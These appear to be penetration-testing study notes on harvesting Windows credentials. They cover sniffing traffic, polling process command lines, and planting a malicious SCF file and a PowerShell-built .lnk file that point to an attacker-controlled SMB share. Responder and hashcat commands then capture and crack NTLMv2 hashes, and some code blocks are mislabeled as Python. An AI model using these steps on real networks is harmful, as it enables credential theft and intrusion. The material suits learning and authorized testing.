## Traffic Capture
- If `Wireshark` is installed, unprivileged users may be able to capture network traffic.
- Option to restrict Npcap driver access to Admins only is not enabled by default
- We can also try running tcpdump or wireshark from our attacker machine if we are within the same environment.
- The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file.

## Process Command Lines
- when we get a shell as a user there may be :
	- scheduled tasks
	- other processes being executed 
- which can pass credentials on the command line.
- We can look for process command lines using something like the script below.

```python
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

## SCF on a File Share
>Shell Command File (SCF) used by windows explorer to move up and down directories, show Desktop ect
>This technique is especially useful if we can get write access to a file share or a directory that is heavily used on a user's workstation
- An SCF file can be manipulated to have the icon file location point to a specific UNC path
- Then we can have windows explorer start an SMB session when the folder where the .scf file resides is accessed.
- If we change the IconFile to an SMB server that we control and then run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share.

#### Malicious SCF File
```python
[Shell] 
Command=2 
IconFile=\\10.10.14.132\share\legit.ico 
[Taskbar] 
Command=ToggleDesktop
#Save this and name it something like @Inventory.scf
# We put the @ at the startso that the file name appear at the top of the directory
```

#### Starting Responder
```python
sudo responder -w -v -I tun0
```

#### Cracking NTLMv2 Hash with Hashcat
```python
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

## Capturing Hashes with a Malicious .lnk File
>SCFs no longer works on 2019 hosts
>We can achieve the same results using a malicious `Ink` file
>We can use various tools like  [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:

```python
$objShell = New-Object -ComObject WScript.Shell 
$lnk = $objShell.CreateShortcut("C:\legit.lnk") 
$lnk.TargetPath = "\\<attackerIP>\@pwn.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request." 
$lnk.HotKey = "Ctrl+Alt+O" 
$lnk.Save()
```
